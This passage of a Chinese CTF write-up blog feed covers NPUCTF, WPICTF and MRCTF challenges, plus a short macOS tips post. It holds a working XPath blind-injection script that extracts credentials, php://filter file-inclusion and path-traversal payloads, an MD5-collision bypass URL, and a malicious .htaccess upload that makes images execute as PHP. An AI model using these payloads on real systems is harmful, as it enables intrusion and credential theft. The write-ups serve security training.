title="ezlogin"></a>ezlogin</h2><p>打开题目，是一个登陆框，随意发送数据后抓包发现传入的数据是xml格式的，猜测是xpath注入。</p><p><img src="/pic/164.png" alt=""></p><p>于是尝试xpath注入万能密码,失败。尝试盲注。发现只能提交一次数据就要刷新。</p><p>当语句执行正确时（<code>&#39; or count(/)=1 or &#39;1</code>），提示非法操作</p><p><img src="/pic/165.png" alt=""></p><p>当语句错误时（<code>&#39; or count(/)=2 or &#39;1</code>）,提示账号或密码错误。</p><p>编写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">se = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    pattern = <span class="string">'id="token" value="(.*?)" /&gt;'</span></span><br><span class="line">    url = <span class="string">'http://94b8372f-c5d8-4348-afa2-522c9b88f1d8.node3.buuoj.cn/login.php'</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    username = payload</span><br><span class="line">    password = <span class="string">'123'</span></span><br><span class="line">    data = <span class="string">"&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;token&gt;"</span> + \</span><br><span class="line">           re.findall(pattern, se.get(url).text)[<span class="number">0</span>] + <span class="string">"&lt;/token&gt;"</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    html = se.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="comment"># print(html.text)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(s_payload, len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len:</span><br><span class="line">        dic = string.printable</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'text()'</span> <span class="keyword">in</span> s_payload:</span><br><span class="line">                payload = <span class="string">"' or substring(%s,%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">"' or substring(name(%s),%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span class="line">            <span class="comment"># payload = "' or substring(name(%s), %d, 1)='%s' or '1" % (s_payload, x, s)</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x = x - <span class="number">1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html = res.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span>:</span><br><span class="line">            result += s</span><br><span class="line">            print(result)</span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_root</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">"/*[1]"</span></span><br><span class="line">    root = search(s_payload)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_define</span><span class="params">(strs)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'%s'</span> % strs</span><br><span class="line">    tables = search(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_root()  #root</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]")  #accounts</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]") # user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[1]")  #id</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[2]")  #usernmae</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[3]")  #password</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[2]/text()") #guest</span></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[3]/text()")  #e10adc3949ba59abbe56e057f20f883e</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[2]/*[2]/text()")  #adm1n</span></span><br><span class="line">    self_define(<span class="string">"/root/*[1]/*[2]/*[3]/text()"</span>)  <span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br></pre></td></tr></table></figure><p>将密码解码得到 guest/123456. Adm1n/gtfly123</p><p>发现链接是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;welcome</span><br></pre></td></tr></table></figure><p>常见的文件包含形式,读取welcom源码，发现过滤了php,base，大写绕过即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;welcome</span><br></pre></td></tr></table></figure><p>得到提示，flag is  in /flag</p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical Cipher"></a>Classical Cipher</h2><p>打开文件，key.txt内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密后的flag请用flag&#123;&#125;包裹</span><br><span class="line"></span><br><span class="line">压缩包密码：gsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure><p>目测凯撒，或者维吉尼亚密码，丢进quipquip，得到密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the_key_is_atbash</span><br></pre></td></tr></table></figure><p>之后是一张图片</p><p>j  pplj j  k</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;验证🐎&quot;&gt;&lt;a href=&quot;#验证🐎&quot; class=&quot;headerlink&quot; title=&quot;验证🐎&quot;&gt;&lt;/a&gt;验证🐎&lt;/h2&gt;&lt;p&gt;给了源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="NPUCTF" scheme="https://sunny250.github.io/tags/NPUCTF/"/>
    
      <category term="xpath注入" scheme="https://sunny250.github.io/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
      <category term="利用文件包含+php临时缓存拿shell" scheme="https://sunny250.github.io/tags/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%B8%B4%E6%97%B6%E7%BC%93%E5%AD%98%E6%8B%BFshell/"/>
    
  </entry>
  
  <entry>
    <title>wpictf2020-wp</title>
    <link href="https://sunny250.github.io/2020/04/18/wpictf2020-wp/"/>
    <id>https://sunny250.github.io/2020/04/18/wpictf2020-wp/</id>
    <published>2020-04-18T09:07:25.000Z</published>
    <updated>2020-04-18T09:07:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="Suckmore-Shell-2-0"><a href="#Suckmore-Shell-2-0" class="headerlink" title="Suckmore Shell 2.0"></a>Suckmore Shell 2.0</h2><p>题目给出了ssh服务器连接上后export不能用了</p><a id="more"></a><p>Cat、tac、less等之类都能用后面发现od可以使用. <a href="https://www.cnblogs.com/ur10ser/p/7624367.html" target="_blank" rel="noopener">参考链接</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sx@kali blog % ssh smsh@smsh.wpictf.xyz</span><br><span class="line">Password: </span><br><span class="line">&gt; ls</span><br><span class="line">flag</span><br><span class="line">      </span><br><span class="line">&gt; </span><br><span class="line">&gt; od -c flag</span><br><span class="line">0000000   e   c   h   o       <span class="string">"   W   P   I   &#123;   S   U   c   k   m   o</span></span><br><span class="line"><span class="string">0000020   r   e   S   o   f   t   w   a   r   e   N   3   3   d   z   2</span></span><br><span class="line"><span class="string">0000040   G   3   T   i   t   T   o   g   e   T   H   E   R   &#125;   "</span>  \n</span><br><span class="line">0000060</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="👉😎👉"><a href="#👉😎👉" class="headerlink" title="👉😎👉"></a>👉😎👉</h2><p>这个题目给了一堆emoji</p><p><img src="/pic/147.png" alt=""></p><p>还给了一个网站</p><p><img src="/pic/148.png" alt=""></p><p>在attach中有存在ssrf</p><p><img src="/pic/149.png" alt=""></p><p>直接给出了flag， url填入<a href="http://storage.zoop/flag.txt即可" target="_blank" rel="noopener">http://storage.zoop/flag.txt即可</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPI&#123;tH4nKs_z00m3r_jh0n50n&#125;</span><br></pre></td></tr></table></figure><h2 id="dorsia2"><a href="#dorsia2" class="headerlink" title="dorsia2"></a>dorsia2</h2><p>题目描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;us-east-1.linodeobjects.com&#x2F;wpictf-challenge-files&#x2F;dorsia.webm The second card.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;dorsia2.wpictf.xyz:31337&#x2F;index.html or 31338 or 31339</span><br><span class="line"></span><br><span class="line">Firefox doesnt like the page... try chromium.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hint: flag in ~&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>在视频中第二张卡片的内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">69</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"GET /%s"</span>, &amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"HTTP 200\r\n\r\n"</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>); </span><br><span class="line">execlp(<span class="string">"cat"</span>,a,a,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><p>使用chrome浏览器访问，提示文本为发送。</p><p>使用nc/burp suite获取flag.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ncat dorsia2.wpictf.xyz 31337 </span><br><span class="line">GET /../flag.txt</span><br><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line">WPI&#123;1_H4VE_2_return_SOME_VIDE0TAP3S&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/../flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: dorsia2.wpictf.xyz:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;linux&quot;&gt;&lt;a href=&quot;#linux&quot; class=&quot;headerlink&quot; title=&quot;linux&quot;&gt;&lt;/a&gt;linux&lt;/h1&gt;&lt;h2 id=&quot;Suckmore-Shell-2-0&quot;&gt;&lt;a href=&quot;#Suckmore-Shell-2-0&quot; class=&quot;headerlink&quot; title=&quot;Suckmore Shell 2.0&quot;&gt;&lt;/a&gt;Suckmore Shell 2.0&lt;/h2&gt;&lt;p&gt;题目给出了ssh服务器连接上后export不能用了&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常刷题" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>macos问题记录</title>
    <link href="https://sunny250.github.io/2020/04/05/macos%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/04/05/macos%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-05T10:25:59.000Z</published>
    <updated>2020-04-05T10:25:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-无法使用手机usb共享网络给mac"><a href="#0x00-无法使用手机usb共享网络给mac" class="headerlink" title="0x00 无法使用手机usb共享网络给mac"></a>0x00 无法使用手机usb共享网络给mac</h2><p>去下载最新的HoRNDIS（截止目前最新是9.2版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;joshuawise.com&#x2F;horndis  &#x2F;&#x2F;HoRNDIS介绍地址</span><br><span class="line">http:&#x2F;&#x2F;joshuawise.com&#x2F;downloads&#x2F;HoRNDIS-9.2.pkg  &#x2F;&#x2F;下载地址</span><br></pre></td></tr></table></figure><h2 id="0x01-如何在命令行中的工作界面界面打开文件窗口-反过来"><a href="#0x01-如何在命令行中的工作界面界面打开文件窗口-反过来" class="headerlink" title="0x01 如何在命令行中的工作界面界面打开文件窗口/反过来"></a>0x01 如何在命令行中的工作界面界面打开文件窗口/反过来</h2><p>在命令行中打开当前文件夹窗口，直接使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open .</span><br></pre></td></tr></table></figure><p>在当前文件夹打开命令行接口，可以在系统偏好设置-键盘-快捷键-服务中进行设置<br><img src="/pic/upload_81c655dd2a316924e2605eb21c3244f4.png" alt=""><br>我设置的是control+option+command+T</p><h2 id="在未开启其他app时如何截图"><a href="#在未开启其他app时如何截图" class="headerlink" title="在未开启其他app时如何截图"></a>在未开启其他app时如何截图</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">control+Shift+command+4 &#x2F;&#x2F;选中截图保存在剪切板</span><br><span class="line">control+command+4  &#x2F;&#x2F;选中截图保存在桌面</span><br><span class="line"></span><br><span class="line">control+Shift+command+3 &#x2F;&#x2F;全屏截图保存在剪切板</span><br><span class="line">control+command+3  &#x2F;&#x2F;全屏截图保存在桌面</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-无法使用手机usb共享网络给mac&quot;&gt;&lt;a href=&quot;#0x00-无法使用手机usb共享网络给mac&quot; class=&quot;headerlink&quot; title=&quot;0x00 无法使用手机usb共享网络给mac&quot;&gt;&lt;/a&gt;0x00 无法使用手机usb共享网络给m
      
    
    </summary>
    
    
      <category term="日常水文" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E6%B0%B4%E6%96%87/"/>
    
    
      <category term="问题记录" scheme="https://sunny250.github.io/tags/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF-wp</title>
    <link href="https://sunny250.github.io/2020/03/27/MRCTF/"/>
    <id>https://sunny250.github.io/2020/03/27/MRCTF/</id>
    <published>2020-03-27T12:38:44.000Z</published>
    <updated>2020-03-27T12:38:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><p>打开题目就有源码</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4d316f88-95dd-4d3f-ad11-e41a47f4d4a6.node3.buuoj.cn&#x2F;?id&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;gg&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br></pre></td></tr></table></figure><p><img src="/pic/144.png" alt=""></p><h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>文件上传</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Length</span>: 458</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file "1.jpg"</span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------400560856011615641723368312644--</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 